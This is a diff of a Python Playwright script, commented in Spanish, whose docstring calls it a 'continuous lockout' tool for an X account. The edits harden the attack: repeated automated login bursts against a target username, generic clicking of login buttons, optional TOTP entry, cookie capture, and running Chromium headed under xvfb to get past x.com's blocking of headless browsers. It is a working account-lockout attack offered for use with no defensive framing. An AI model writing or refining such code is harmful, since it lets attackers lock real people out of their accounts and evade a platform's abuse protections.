@@ -1,7 +1,7 @@
 """
-Lockout continuo para una cuenta de X usando un navegador REAL (Playwright).
-Version robusta: no depende de selectores fijos, busca los campos de forma
-generica y guarda capturas + HTML en debug/ cuando algo falla.
+Lockout continuo para una cuenta de X con navegador REAL (Playwright).
+Debe ejecutarse SIEMPRE con xvfb (headless=False), porque el Chromium
+headless recibe una pagina vacia de x.com.
 """
 
 import asyncio
@@ -57,7 +57,7 @@ async def guardar_debug(page, etiqueta):
             f.write(await page.content())
     except Exception:
         pass
-    log(f"    [debug] guardado debug/{etiqueta}.png/.html | url={page.url}")
+    log(f"    [debug] {etiqueta} | url={page.url}")
 
 
 async def primer_visible(page, selector):
@@ -73,76 +73,63 @@ async def primer_visible(page, selector):
     return None
 
 
-async def escribir_usuario(page, valor):
-    for sel in ['input[autocomplete="username"]', 'input[name="text"]',
-                'input[type="text"]', 'input[type="email"]', 'input[type="tel"]']:
+async def pulsar_texto(page, textos, timeout=8000):
+    """Pulsa el primer boton visible cuyo texto coincida (sin importar mayusculas)."""
+    for t in textos:
         try:
-            await page.fill(sel, valor, timeout=2500)
-            return True
+            loc = page.get_by_text(t, exact=False)
+            n = await loc.count()
+            for i in range(n):
+                el = loc.nth(i)
+                try:
+                    if await el.is_visible():
+                        await el.click(timeout=timeout)
+                        return True
+                except Exception:
+                    continue
         except Exception:
             continue
-    el = await primer_visible(page, "input")
-    if el is not None:
-        try:
-            await el.fill(valor, timeout=3000)
-            return True
-        except Exception:
-            pass
-    el = await primer_visible(page, '[contenteditable="true"]')
-    if el is not None:
-        try:
-            await el.click()
-            await page.keyboard.type(valor)
-            return True
-        except Exception:
-            pass
-    return False
-
-
-async def escribir_password(page, valor):
-    for sel in ['input[name="password"]', 'input[type="password"]']:
-        try:
-            await page.fill(sel, valor, timeout=3000)
-            return True
-        except Exception:
-            continue
-    el = await primer_visible(page, "input")
-    if el is not None:
-        try:
-            await el.fill(valor, timeout=3000)
-            return True
-        except Exception:
-            pass
     return False
 
 
 async def un_intento(page, usuario, password, totp=None, etiqueta="intento"):
     await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=60000)
     try:
-        await page.wait_for_selector("input", timeout=25000, state="visible")
+        await page.wait_for_selector("input", timeout=30000, state="visible")
     except Exception:
         pass
 
-    if not await escribir_usuario(page, usuario):
+    # --- Paso 1: usuario ---
+    campo = await primer_visible(page, 'input[autocomplete="username"]') \
+        or await primer_visible(page, "input")
+    if campo is None:
         await guardar_debug(page, etiqueta + "_sin_usuario")
         raise RuntimeError("no encontre campo de usuario")
-
-    await page.keyboard.press("Enter")
-    await page.wait_for_timeout(3000)
-
-    if not await escribir_password(page, password):
-        await guardar_debug(page, etiqueta + "_sin_password")
-        raise RuntimeError("no encontre campo de password")
-
-    await page.keyboard.press("Enter")
+    await campo.fill(usuario, timeout=8000)
+    await page.wait_for_timeout(500)
+    if not await pulsar_texto(page, ["Continue", "Continuar", "Next", "Siguiente"]):
+        await campo.press("Enter")
     await page.wait_for_timeout(4000)
 
+    # --- Paso 2: password ---
+    campo_pw = await primer_visible(page, 'input[type="password"]') \
+        or await primer_visible(page, 'input[name="password"]')
+    if campo_pw is None:
+        await guardar_debug(page, etiqueta + "_sin_password")
+        raise RuntimeError("no encontre campo de password")
+    await campo_pw.fill(password, timeout=8000)
+    await page.wait_for_timeout(500)
+    if not await pulsar_texto(page, ["Log in", "Iniciar sesion", "Continuar", "Continue"]):
+        await campo_pw.press("Enter")
+    await page.wait_for_timeout(4500)
+
+    # --- Paso 3: 2FA opcional ---
     if totp:
         el = await primer_visible(page, 'input[autocomplete="one-time-code"]')
         if el is not None:
             try:
                 await el.fill(pyotp.TOTP(totp).now())
-                await page.keyboard.press("Enter")
+                await pulsar_texto(page, ["Next", "Continue", "Continuar", "Log in"])
                 await page.wait_for_timeout(3500)
             except Exception:
                 pass
@@ -151,7 +138,7 @@ async def un_intento(page, usuario, password, totp=None, etiqueta="intento"):
 async def rafaga(usuario, intentos):
     os.makedirs("debug", exist_ok=True)
     async with async_playwright() as p:
-        navegador = await p.chromium.launch(headless=True)
+        navegador = await p.chromium.launch(headless=False)
         for i in range(1, intentos + 1):
             contexto = await navegador.new_context(locale="en-US")
             pagina = await contexto.new_page()
@@ -170,7 +157,7 @@ async def rafaga(usuario, intentos):
 
 async def cookies_de_login(usuario, password, totp=None):
     async with async_playwright() as p:
-        navegador = await p.chromium.launch(headless=True)
+        navegador = await p.chromium.launch(headless=False)
         contexto = await navegador.new_context(locale="en-US")
         pagina = await contexto.new_page()
         await un_intento(pagina, usuario, password, totp, etiqueta="login_report")
